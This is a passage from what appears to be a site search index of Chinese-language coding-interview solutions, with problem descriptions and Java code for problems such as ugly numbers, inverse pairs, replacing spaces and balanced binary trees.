public int getMost(int[][] values) { if (values == null || values.length == 0 || values[0].length == 0) return 0; int n = values[0].length; int[] dp = new int[n]; for (int[] value : values) { dp[0] += value[0]; for (int i = 1; i < n; i++) dp[i] = Math.max(dp[i], dp[i - 1]) + value[i]; } return dp[n - 1];
}`}]},{path:"/%E9%A2%98%E8%A7%A3/48.%20%E6%9C%80%E9%95%BF%E4%B8%8D%E5%90%AB%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2.html",title:"48. \u6700\u957F\u4E0D\u542B\u91CD\u590D\u5B57\u7B26\u7684\u5B50\u5B57\u7B26\u4E32",pathLocale:"/",contents:[{header:"48. \u6700\u957F\u4E0D\u542B\u91CD\u590D\u5B57\u7B26\u7684\u5B50\u5B57\u7B26\u4E32",slug:"_48-\u6700\u957F\u4E0D\u542B\u91CD\u590D\u5B57\u7B26\u7684\u5B50\u5B57\u7B26\u4E32",content:""},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u8F93\u5165\u4E00\u4E2A\u5B57\u7B26\u4E32\uFF08\u53EA\u5305\u542B a~z \u7684\u5B57\u7B26\uFF09\uFF0C\u6C42\u5176\u6700\u957F\u4E0D\u542B\u91CD\u590D\u5B57\u7B26\u7684\u5B50\u5B57\u7B26\u4E32\u7684\u957F\u5EA6\u3002\u4F8B\u5982\u5BF9\u4E8E arabcacfr\uFF0C\u6700\u957F\u4E0D\u542B\u91CD\u590D\u5B57\u7B26\u7684\u5B50\u5B57\u7B26\u4E32\u4E3A acfr\uFF0C\u957F\u5EA6\u4E3A 4\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`public int longestSubStringWithoutDuplication(String str) { int curLen = 0; int maxLen = 0; int[] preIndexs = new int[26]; Arrays.fill(preIndexs, -1); for (int curI = 0; curI < str.length(); curI++) { int c = str.charAt(curI) - 'a'; int preI = preIndexs[c]; if (preI == -1 || curI - preI > curLen) { curLen++; } else { maxLen = Math.max(maxLen, curLen); curLen = curI - preI; } preIndexs[c] = curI; } maxLen = Math.max(maxLen, curLen); return maxLen;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/49.%20%E4%B8%91%E6%95%B0.html",title:"49. \u4E11\u6570",pathLocale:"/",contents:[{header:"49. \u4E11\u6570",slug:"_49-\u4E11\u6570",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u628A\u53EA\u5305\u542B\u56E0\u5B50 2\u30013 \u548C 5 \u7684\u6570\u79F0\u4F5C\u4E11\u6570\uFF08Ugly Number\uFF09\u3002\u4F8B\u5982 6\u30018 \u90FD\u662F\u4E11\u6570\uFF0C\u4F46 14 \u4E0D\u662F\uFF0C\u56E0\u4E3A\u5B83\u5305\u542B\u56E0\u5B50 7\u3002\u4E60\u60EF\u4E0A\u6211\u4EEC\u628A 1 \u5F53\u505A\u662F\u7B2C\u4E00\u4E2A\u4E11\u6570\u3002\u6C42\u6309\u4ECE\u5C0F\u5230\u5927\u7684\u987A\u5E8F\u7684\u7B2C N \u4E2A\u4E11\u6570\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`public int GetUglyNumber_Solution(int N) { if (N <= 6) return N; int i2 = 0, i3 = 0, i5 = 0; int[] dp = new int[N]; dp[0] = 1; for (int i = 1; i < N; i++) { int next2 = dp[i2] * 2, next3 = dp[i3] * 3, next5 = dp[i5] * 5; dp[i] = Math.min(next2, Math.min(next3, next5)); if (dp[i] == next2) i2++; if (dp[i] == next3) i3++; if (dp[i] == next5) i5++; } return dp[N - 1];
}`}]},{path:"/%E9%A2%98%E8%A7%A3/5.%20%E6%9B%BF%E6%8D%A2%E7%A9%BA%E6%A0%BC.html",title:"5. \u66FF\u6362\u7A7A\u683C",pathLocale:"/",contents:[{header:"5. \u66FF\u6362\u7A7A\u683C",slug:"_5-\u66FF\u6362\u7A7A\u683C",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u5C06\u4E00\u4E2A\u5B57\u7B26\u4E32\u4E2D\u7684\u7A7A\u683C\u66FF\u6362\u6210 "%20"\u3002
Input:
"A B" Output:
"A%20B"`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u2460 \u5728\u5B57\u7B26\u4E32\u5C3E\u90E8\u586B\u5145\u4EFB\u610F\u5B57\u7B26\uFF0C\u4F7F\u5F97\u5B57\u7B26\u4E32\u7684\u957F\u5EA6\u7B49\u4E8E\u66FF\u6362\u4E4B\u540E\u7684\u957F\u5EA6\u3002\u56E0\u4E3A\u4E00\u4E2A\u7A7A\u683C\u8981\u66FF\u6362\u6210\u4E09\u4E2A\u5B57\u7B26\uFF08%20\uFF09\uFF0C\u6240\u4EE5\u5F53\u904D\u5386\u5230\u4E00\u4E2A\u7A7A\u683C\u65F6\uFF0C\u9700\u8981\u5728\u5C3E\u90E8\u586B\u5145\u4E24\u4E2A\u4EFB\u610F\u5B57\u7B26\u3002
\u2461 \u4EE4 P1 \u6307\u5411\u5B57\u7B26\u4E32\u539F\u6765\u7684\u672B\u5C3E\u4F4D\u7F6E\uFF0CP2 \u6307\u5411\u5B57\u7B26\u4E32\u73B0\u5728\u7684\u672B\u5C3E\u4F4D\u7F6E\u3002P1 \u548C P2 \u4ECE\u540E\u5411\u524D\u904D\u5386\uFF0C\u5F53 P1 \u904D\u5386\u5230\u4E00\u4E2A\u7A7A\u683C\u65F6\uFF0C\u5C31\u9700\u8981\u4EE4 P2 \u6307\u5411\u7684\u4F4D\u7F6E\u4F9D\u6B21\u586B\u5145 02%\uFF08\u6CE8\u610F\u662F\u9006\u5E8F\u7684\uFF09\uFF0C\u5426\u5219\u5C31\u586B\u5145\u4E0A P1 \u6307\u5411\u5B57\u7B26\u7684\u503C\u3002\u4ECE\u540E\u5411\u524D\u904D\u662F\u4E3A\u4E86\u5728\u6539\u53D8 P2 \u6240\u6307\u5411\u7684\u5185\u5BB9\u65F6\uFF0C\u4E0D\u4F1A\u5F71\u54CD\u5230 P1 \u904D\u5386\u539F\u6765\u5B57\u7B26\u4E32\u7684\u5185\u5BB9\u3002
\u2462 \u5F53 P2 \u9047\u5230 P1 \u65F6\uFF08P2 <= P1\uFF09\uFF0C\u6216\u8005\u904D\u5386\u7ED3\u675F\uFF08P1 < 0\uFF09\uFF0C\u9000\u51FA\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f7c1fea2-c1e7-4d31-94b5-0d9df85e093c.gif" width="350px">
public String replaceSpace(StringBuffer str) { int P1 = str.length() - 1; for (int i = 0; i <= P1; i++) if (str.charAt(i) == ' ') str.append(" "); int P2 = str.length() - 1; while (P1 >= 0 && P2 > P1) { char c = str.charAt(P1--); if (c == ' ') { str.setCharAt(P2--, '0'); str.setCharAt(P2--, '2'); str.setCharAt(P2--, '%'); } else { str.setCharAt(P2--, c); } } return str.toString();
}`}]},{path:"/%E9%A2%98%E8%A7%A3/50.%20%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E5%AD%97%E7%AC%A6%E4%BD%8D%E7%BD%AE.html",title:"50. \u7B2C\u4E00\u4E2A\u53EA\u51FA\u73B0\u4E00\u6B21\u7684\u5B57\u7B26\u4F4D\u7F6E",pathLocale:"/",contents:[{header:"50. \u7B2C\u4E00\u4E2A\u53EA\u51FA\u73B0\u4E00\u6B21\u7684\u5B57\u7B26\u4F4D\u7F6E",slug:"_50-\u7B2C\u4E00\u4E2A\u53EA\u51FA\u73B0\u4E00\u6B21\u7684\u5B57\u7B26\u4F4D\u7F6E",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u5728\u4E00\u4E2A\u5B57\u7B26\u4E32\u4E2D\u627E\u5230\u7B2C\u4E00\u4E2A\u53EA\u51FA\u73B0\u4E00\u6B21\u7684\u5B57\u7B26\uFF0C\u5E76\u8FD4\u56DE\u5B83\u7684\u4F4D\u7F6E\u3002\u5B57\u7B26\u4E32\u53EA\u5305\u542B ASCII \u7801\u5B57\u7B26\u3002
Input: abacc
Output: b`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u6700\u76F4\u89C2\u7684\u89E3\u6CD5\u662F\u4F7F\u7528 HashMap \u5BF9\u51FA\u73B0\u6B21\u6570\u8FDB\u884C\u7EDF\u8BA1\uFF1A\u5B57\u7B26\u505A\u4E3A key\uFF0C\u51FA\u73B0\u6B21\u6570\u4F5C\u4E3A value\uFF0C\u904D\u5386\u5B57\u7B26\u4E32\u6BCF\u6B21\u90FD\u5C06 key \u5BF9\u5E94\u7684 value \u52A0 1\u3002\u6700\u540E\u518D\u904D\u5386\u8FD9\u4E2A HashMap \u5C31\u53EF\u4EE5\u627E\u51FA\u51FA\u73B0\u6B21\u6570\u4E3A 1 \u7684\u5B57\u7B26\u3002
\u8003\u8651\u5230\u8981\u7EDF\u8BA1\u7684\u5B57\u7B26\u8303\u56F4\u6709\u9650\uFF0C\u4E5F\u53EF\u4EE5\u4F7F\u7528\u6574\u578B\u6570\u7EC4\u4EE3\u66FF HashMap\u3002ASCII \u7801\u53EA\u6709 128 \u4E2A\u5B57\u7B26\uFF0C\u56E0\u6B64\u53EF\u4EE5\u4F7F\u7528\u957F\u5EA6\u4E3A 128 \u7684\u6574\u578B\u6570\u7EC4\u6765\u5B58\u50A8\u6BCF\u4E2A\u5B57\u7B26\u51FA\u73B0\u7684\u6B21\u6570\u3002
public int FirstNotRepeatingChar(String str) { int[] cnts = new int[128]; for (int i = 0; i < str.length(); i++) cnts[str.charAt(i)]++; for (int i = 0; i < str.length(); i++) if (cnts[str.charAt(i)] == 1) return i; return -1;
}
\u4EE5\u4E0A\u5B9E\u73B0\u7684\u7A7A\u95F4\u590D\u6742\u5EA6\u8FD8\u4E0D\u662F\u6700\u4F18\u7684\u3002\u8003\u8651\u5230\u53EA\u9700\u8981\u627E\u5230\u53EA\u51FA\u73B0\u4E00\u6B21\u7684\u5B57\u7B26\uFF0C\u90A3\u4E48\u9700\u8981\u7EDF\u8BA1\u7684\u6B21\u6570\u4FE1\u606F\u53EA\u6709 0,1,\u66F4\u5927\uFF0C\u4F7F\u7528\u4E24\u4E2A\u6BD4\u7279\u4F4D\u5C31\u80FD\u5B58\u50A8\u8FD9\u4E9B\u4FE1\u606F\u3002
public int FirstNotRepeatingChar2(String str) { BitSet bs1 = new BitSet(128); BitSet bs2 = new BitSet(128); for (char c : str.toCharArray()) { if (!bs1.get(c) && !bs2.get(c)) bs1.set(c); // 0 0 -> 0 1 else if (bs1.get(c) && !bs2.get(c)) bs2.set(c); // 0 1 -> 1 1 } for (int i = 0; i < str.length(); i++) { char c = str.charAt(i); if (bs1.get(c) && !bs2.get(c)) // 0 1 return i; } return -1;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/51.%20%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E9%80%86%E5%BA%8F%E5%AF%B9.html",title:"51. \u6570\u7EC4\u4E2D\u7684\u9006\u5E8F\u5BF9",pathLocale:"/",contents:[{header:"51. \u6570\u7EC4\u4E2D\u7684\u9006\u5E8F\u5BF9",slug:"_51-\u6570\u7EC4\u4E2D\u7684\u9006\u5E8F\u5BF9",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u5728\u6570\u7EC4\u4E2D\u7684\u4E24\u4E2A\u6570\u5B57\uFF0C\u5982\u679C\u524D\u9762\u4E00\u4E2A\u6570\u5B57\u5927\u4E8E\u540E\u9762\u7684\u6570\u5B57\uFF0C\u5219\u8FD9\u4E24\u4E2A\u6570\u5B57\u7EC4\u6210\u4E00\u4E2A\u9006\u5E8F\u5BF9\u3002\u8F93\u5165\u4E00\u4E2A\u6570\u7EC4\uFF0C\u6C42\u51FA\u8FD9\u4E2A\u6570\u7EC4\u4E2D\u7684\u9006\u5E8F\u5BF9\u7684\u603B\u6570\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`private long cnt = 0;
private int[] tmp; // \u5728\u8FD9\u91CC\u58F0\u660E\u8F85\u52A9\u6570\u7EC4\uFF0C\u800C\u4E0D\u662F\u5728 merge() \u9012\u5F52\u51FD\u6570\u4E2D\u58F0\u660E public int InversePairs(int[] nums) { tmp = new int[nums.length]; mergeSort(nums, 0, nums.length - 1); return (int) (cnt % 1000000007);
} private void mergeSort(int[] nums, int l, int h) { if (h - l < 1) return; int m = l + (h - l) / 2; mergeSort(nums, l, m); mergeSort(nums, m + 1, h); merge(nums, l, m, h);
} private void merge(int[] nums, int l, int m, int h) { int i = l, j = m + 1, k = l; while (i <= m || j <= h) { if (i > m) tmp[k] = nums[j++]; else if (j > h) tmp[k] = nums[i++]; else if (nums[i] <= nums[j]) tmp[k] = nums[i++]; else { tmp[k] = nums[j++]; this.cnt += m - i + 1; // nums[i] > nums[j]\uFF0C\u8BF4\u660E nums[i...mid] \u90FD\u5927\u4E8E nums[j] } k++; } for (k = l; k <= h; k++) nums[k] = tmp[k];
}`}]},{path:"/%E9%A2%98%E8%A7%A3/52.%20%E4%B8%A4%E4%B8%AA%E9%93%BE%E8%A1%A8%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%85%AC%E5%85%B1%E7%BB%93%E7%82%B9.html",title:"52. \u4E24\u4E2A\u94FE\u8868\u7684\u7B2C\u4E00\u4E2A\u516C\u5171\u7ED3\u70B9",pathLocale:"/",contents:[{header:"52. \u4E24\u4E2A\u94FE\u8868\u7684\u7B2C\u4E00\u4E2A\u516C\u5171\u7ED3\u70B9",slug:"_52-\u4E24\u4E2A\u94FE\u8868\u7684\u7B2C\u4E00\u4E2A\u516C\u5171\u7ED3\u70B9",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:'![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/5f1cb999-cb9a-4f6c-a0af-d90377295ab8.png" width="500)'},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u8BBE A \u7684\u957F\u5EA6\u4E3A a + c\uFF0CB \u7684\u957F\u5EA6\u4E3A b + c\uFF0C\u5176\u4E2D c \u4E3A\u5C3E\u90E8\u516C\u5171\u90E8\u5206\u957F\u5EA6\uFF0C\u53EF\u77E5 a + c + b = b + c + a\u3002
\u5F53\u8BBF\u95EE\u94FE\u8868 A \u7684\u6307\u9488\u8BBF\u95EE\u5230\u94FE\u8868\u5C3E\u90E8\u65F6\uFF0C\u4EE4\u5B83\u4ECE\u94FE\u8868 B \u7684\u5934\u90E8\u91CD\u65B0\u5F00\u59CB\u8BBF\u95EE\u94FE\u8868 B\uFF1B\u540C\u6837\u5730\uFF0C\u5F53\u8BBF\u95EE\u94FE\u8868 B \u7684\u6307\u9488\u8BBF\u95EE\u5230\u94FE\u8868\u5C3E\u90E8\u65F6\uFF0C\u4EE4\u5B83\u4ECE\u94FE\u8868 A \u7684\u5934\u90E8\u91CD\u65B0\u5F00\u59CB\u8BBF\u95EE\u94FE\u8868 A\u3002\u8FD9\u6837\u5C31\u80FD\u63A7\u5236\u8BBF\u95EE A \u548C B \u4E24\u4E2A\u94FE\u8868\u7684\u6307\u9488\u80FD\u540C\u65F6\u8BBF\u95EE\u5230\u4EA4\u70B9\u3002
public ListNode FindFirstCommonNode(ListNode pHead1, ListNode pHead2) { ListNode l1 = pHead1, l2 = pHead2; while (l1 != l2) { l1 = (l1 == null) ? pHead2 : l1.next; l2 = (l2 == null) ? pHead1 : l2.next; } return l1;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/53.%20%E6%95%B0%E5%AD%97%E5%9C%A8%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0.html",title:"53. \u6570\u5B57\u5728\u6392\u5E8F\u6570\u7EC4\u4E2D\u51FA\u73B0\u7684\u6B21\u6570",pathLocale:"/",contents:[{header:"53. \u6570\u5B57\u5728\u6392\u5E8F\u6570\u7EC4\u4E2D\u51FA\u73B0\u7684\u6B21\u6570",slug:"_53-\u6570\u5B57\u5728\u6392\u5E8F\u6570\u7EC4\u4E2D\u51FA\u73B0\u7684\u6B21\u6570",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`Input:
nums = 1, 2, 3, 3, 3, 3, 4, 6
K = 3 Output:
4`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u53EA\u8981\u80FD\u627E\u51FA\u7ED9\u5B9A\u7684\u6570\u5B57 k \u5728\u6709\u5E8F\u6570\u7EC4\u7B2C\u4E00\u4E2A\u4F4D\u7F6E\u548C\u6700\u540E\u4E00\u4E2A\u4F4D\u7F6E\uFF0C\u5C31\u80FD\u77E5\u9053\u8BE5\u6570\u5B57\u51FA\u73B0\u7684\u6B21\u6570\u3002
\u5148\u8003\u8651\u5982\u4F55\u5B9E\u73B0\u5BFB\u627E\u6570\u5B57\u5728\u6709\u5E8F\u6570\u7EC4\u7684\u7B2C\u4E00\u4E2A\u4F4D\u7F6E\u3002\u6B63\u5E38\u7684\u4E8C\u5206\u67E5\u627E\u5982\u4E0B\uFF0C\u5728\u67E5\u627E\u5230\u7ED9\u5B9A\u5143\u7D20 k \u4E4B\u540E\uFF0C\u7ACB\u5373\u8FD4\u56DE\u5F53\u524D\u7D22\u5F15\u4E0B\u6807\u3002
public int binarySearch(int[] nums, int K) { int l = 0, h = nums.length - 1; while (l <= h) { int m = l + (h - l) / 2; if (nums[m] == K) { return m; } else if (nums[m] > K) { h = m - 1; } else { l = m + 1; } } return -1;
}
\u4F46\u662F\u5728\u67E5\u627E\u7B2C\u4E00\u4E2A\u4F4D\u7F6E\u65F6\uFF0C\u627E\u5230\u5143\u7D20\u4E4B\u540E\u5E94\u8BE5\u7EE7\u7EED\u5F80\u524D\u627E\u3002\u4E5F\u5C31\u662F\u5F53 nums[m]>=k \u65F6\uFF0C\u5728\u5DE6\u533A\u95F4\u7EE7\u7EED\u67E5\u627E\uFF0C\u5DE6\u533A\u95F4\u5E94\u8BE5\u5305\u542B m \u4F4D\u7F6E\u3002
private int binarySearch(int[] nums, int K) { int l = 0, h = nums.length; while (l < h) { int m = l + (h - l) / 2; if (nums[m] >= K) h = m; else l = m + 1; } return l;
}
\u67E5\u627E\u6700\u540E\u4E00\u4E2A\u4F4D\u7F6E\u53EF\u4EE5\u8F6C\u6362\u6210\u5BFB\u627E k+1 \u7684\u7B2C\u4E00\u4E2A\u4F4D\u7F6E\uFF0C\u5E76\u518D\u5F80\u524D\u79FB\u52A8\u4E00\u4E2A\u4F4D\u7F6E\u3002
public int GetNumberOfK(int[] nums, int K) { int first = binarySearch(nums, K); int last = binarySearch(nums, K + 1); return (first == nums.length || nums[first] != K) ? 0 : last - first;
}
\u9700\u8981\u6CE8\u610F\u4EE5\u4E0A\u5B9E\u73B0\u7684\u67E5\u627E\u7B2C\u4E00\u4E2A\u4F4D\u7F6E\u7684 binarySearch \u65B9\u6CD5\uFF0Ch \u7684\u521D\u59CB\u503C\u4E3A nums.length\uFF0C\u800C\u4E0D\u662F nums.length - 1\u3002\u5148\u770B\u4EE5\u4E0B\u793A\u4F8B\uFF1A
nums = [2,2], k = 2
\u5982\u679C h \u7684\u53D6\u503C\u4E3A nums.length - 1\uFF0C\u90A3\u4E48\u5728\u67E5\u627E\u6700\u540E\u4E00\u4E2A\u4F4D\u7F6E\u65F6\uFF0CbinarySearch(nums, k + 1) - 1 = 1 - 1 = 0\u3002\u8FD9\u662F\u56E0\u4E3A binarySearch \u53EA\u4F1A\u8FD4\u56DE [0, nums.length - 1] \u8303\u56F4\u7684\u503C\uFF0C\u5BF9\u4E8E binarySearch([2,2], 3) \uFF0C\u6211\u4EEC\u5E0C\u671B\u8FD4\u56DE 3 \u63D2\u5165 nums \u4E2D\u7684\u4F4D\u7F6E\uFF0C\u4E5F\u5C31\u662F\u6570\u7EC4\u6700\u540E\u4E00\u4E2A\u4F4D\u7F6E\u518D\u5F80\u540E\u4E00\u4E2A\u4F4D\u7F6E\uFF0C\u5373 nums.length\u3002\u6240\u4EE5\u6211\u4EEC\u9700\u8981\u5C06 h \u53D6\u503C\u4E3A nums.length\uFF0C\u4ECE\u800C\u4F7F\u5F97 binarySearch \u8FD4\u56DE\u7684\u533A\u95F4\u66F4\u5927\uFF0C\u80FD\u591F\u8986\u76D6 k \u5927\u4E8E nums \u6700\u540E\u4E00\u4E2A\u5143\u7D20\u7684\u60C5\u51B5\u3002`}]},{path:"/%E9%A2%98%E8%A7%A3/54.%20%E4%BA%8C%E5%8F%89%E6%9F%A5%E6%89%BE%E6%A0%91%E7%9A%84%E7%AC%AC%20K%20%E4%B8%AA%E7%BB%93%E7%82%B9.html",title:"54. \u4E8C\u53C9\u67E5\u627E\u6811\u7684\u7B2C K \u4E2A\u7ED3\u70B9",pathLocale:"/",contents:[{header:"54. \u4E8C\u53C9\u67E5\u627E\u6811\u7684\u7B2C K \u4E2A\u7ED3\u70B9",slug:"_54-\u4E8C\u53C9\u67E5\u627E\u6811\u7684\u7B2C-k-\u4E2A\u7ED3\u70B9",content:"NowCoder"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u5229\u7528\u4E8C\u53C9\u67E5\u627E\u6811\u4E2D\u5E8F\u904D\u5386\u6709\u5E8F\u7684\u7279\u70B9\u3002
private TreeNode ret;
private int cnt = 0; public TreeNode KthNode(TreeNode pRoot, int k) { inOrder(pRoot, k); return ret;
} private void inOrder(TreeNode root, int k) { if (root == null || cnt >= k) return; inOrder(root.left, k); cnt++; if (cnt == k) ret = root; inOrder(root.right, k);
}`}]},{path:"/%E9%A2%98%E8%A7%A3/55.1%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6.html",title:"55.1 \u4E8C\u53C9\u6811\u7684\u6DF1\u5EA6",pathLocale:"/",contents:[{header:"55.1 \u4E8C\u53C9\u6811\u7684\u6DF1\u5EA6",slug:"_55-1-\u4E8C\u53C9\u6811\u7684\u6DF1\u5EA6",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u4ECE\u6839\u7ED3\u70B9\u5230\u53F6\u7ED3\u70B9\u4F9D\u6B21\u7ECF\u8FC7\u7684\u7ED3\u70B9\uFF08\u542B\u6839\u3001\u53F6\u7ED3\u70B9\uFF09\u5F62\u6210\u6811\u7684\u4E00\u6761\u8DEF\u5F84\uFF0C\u6700\u957F\u8DEF\u5F84\u7684\u957F\u5EA6\u4E3A\u6811\u7684\u6DF1\u5EA6\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ba355101-4a93-4c71-94fb-1da83639727b.jpg" width="350px)`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`public int TreeDepth(TreeNode root) { return root == null ? 0 : 1 + Math.max(TreeDepth(root.left), TreeDepth(root.right));
}`}]},{path:"/%E9%A2%98%E8%A7%A3/55.2%20%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91.html",title:"55.2 \u5E73\u8861\u4E8C\u53C9\u6811",pathLocale:"/",contents:[{header:"55.2 \u5E73\u8861\u4E8C\u53C9\u6811",slug:"_55-2-\u5E73\u8861\u4E8C\u53C9\u6811",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u5E73\u8861\u4E8C\u53C9\u6811\u5DE6\u53F3\u5B50\u6811\u9AD8\u5EA6\u5DEE\u4E0D\u8D85\u8FC7 1\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/af1d1166-63af-47b6-9aa3-2bf2bd37bd03.jpg" width="250px)`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`private boolean isBalanced = true; public boolean IsBalanced_Solution(TreeNode root) { height(root); return isBalanced;
} private int height(TreeNode root) { if (root == null || !isBalanced) return 0; int left = height(root.left); int right = height(root.right); if (Math.abs(left - right) > 1) isBalanced = false; return 1 + Math.max(left, right);
}`}]},{path:"/%E9%A2%98%E8%A7%A3/56.%20%E6%95%B0%E7%BB%84%E4%B8%AD%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E6%95%B0%E5%AD%97.html",title:"56. \u6570\u7EC4\u4E2D\u53EA\u51FA\u73B0\u4E00\u6B21\u7684\u6570\u5B57",pathLocale:"/",contents:[{header:"56. \u6570\u7EC4\u4E2D\u53EA\u51FA\u73B0\u4E00\u6B21\u7684\u6570\u5B57",slug:"_56-\u6570\u7EC4\u4E2D\u53EA\u51FA\u73B0\u4E00\u6B21\u7684\u6570\u5B57",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u4E00\u4E2A\u6574\u578B\u6570\u7EC4\u91CC\u9664\u4E86\u4E24\u4E2A\u6570\u5B57\u4E4B\u5916\uFF0C\u5176\u4ED6\u7684\u6570\u5B57\u90FD\u51FA\u73B0\u4E86\u4E24\u6B21\uFF0C\u627E\u51FA\u8FD9\u4E24\u4E2A\u6570\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u4E24\u4E2A\u76F8\u7B49\u7684\u5143\u7D20\u5F02\u6216\u7684\u7ED3\u679C\u4E3A 0\uFF0C\u800C 0 \u4E0E\u4EFB\u610F\u6570 x \u5F02\u6216\u7684\u7ED3\u679C\u90FD\u4E3A x\u3002
\u5BF9\u672C\u9898\u7ED9\u7684\u6570\u7EC4\u7684\u6240\u6709\u5143\u7D20\u6267\u884C\u5F02\u6216\u64CD\u4F5C\uFF0C\u5F97\u5230\u7684\u662F\u4E24\u4E2A\u4E0D\u5B58\u5728\u91CD\u590D\u7684\u5143\u7D20\u5F02\u6216\u7684\u7ED3\u679C\u3002\u4F8B\u5982\u5BF9\u4E8E\u6570\u7EC4 [x,x,y,y,z,k]\uFF0Cx^x^y^y^z^k = 0^y^y^z^k = y^y^z^k = 0^z^k = z^k\u3002
\u4E24\u4E2A\u4E0D\u76F8\u7B49\u7684\u5143\u7D20\u5728\u4F4D\u7EA7\u8868\u793A\u4E0A\u4E00\u5B9A\u4F1A\u6709\u6240\u4E0D\u540C\uFF0C\u56E0\u6B64\u8FD9\u4E24\u4E2A\u5143\u7D20\u5F02\u6216\u5F97\u5230\u7684\u7ED3\u679C diff \u4E00\u5B9A\u4E0D\u4E3A 0\u3002\u4F4D\u8FD0\u7B97 diff & -diff \u80FD\u5F97\u5230 diff \u4F4D\u7EA7\u8868\u793A\u4E2D\u6700\u53F3\u4FA7\u4E3A 1 \u7684\u4F4D\uFF0C\u4EE4 diff = diff & -diff\u3002\u5C06 diff \u4F5C\u4E3A\u533A\u5206\u4E24\u4E2A\u5143\u7D20\u7684\u4F9D\u636E\uFF0C\u4E00\u5B9A\u6709\u4E00\u4E2A\u5143\u7D20\u5BF9 diff \u8FDB\u884C\u5F02\u6216\u7684\u7ED3\u679C\u4E3A 0\uFF0C\u53E6\u4E00\u4E2A\u7ED3\u679C\u975E 0\u3002\u8BBE\u4E0D\u76F8\u7B49\u7684\u4E24\u4E2A\u5143\u7D20\u5206\u522B\u4E3A z \u548C k\uFF0C\u904D\u5386\u6570\u7EC4\u6240\u6709\u5143\u7D20\uFF0C\u5224\u65AD\u5143\u7D20\u4E0E diff \u7684\u5F02\u6216\u7ED3\u679C\u662F\u5426\u4E3A 0\uFF0C\u5982\u679C\u662F\u7684\u8BDD\u5C06\u5143\u7D20\u4E0E z \u8FDB\u884C\u5F02\u6216\u5E76\u8D4B\u503C\u7ED9 z\uFF0C\u5426\u5219\u4E0E k \u8FDB\u884C\u5F02\u6216\u5E76\u8D4B\u503C\u7ED9 k\u3002\u6570\u7EC4\u4E2D\u76F8\u7B49\u7684\u5143\u7D20\u4E00\u5B9A\u4F1A\u540C\u65F6\u4E0E z \u6216\u8005\u4E0E k \u8FDB\u884C\u5F02\u6216\u64CD\u4F5C\uFF0C\u800C\u4E0D\u662F\u4E00\u4E2A\u4E0E z \u8FDB\u884C\u5F02\u6216\uFF0C\u4E00\u4E2A\u4E0E k 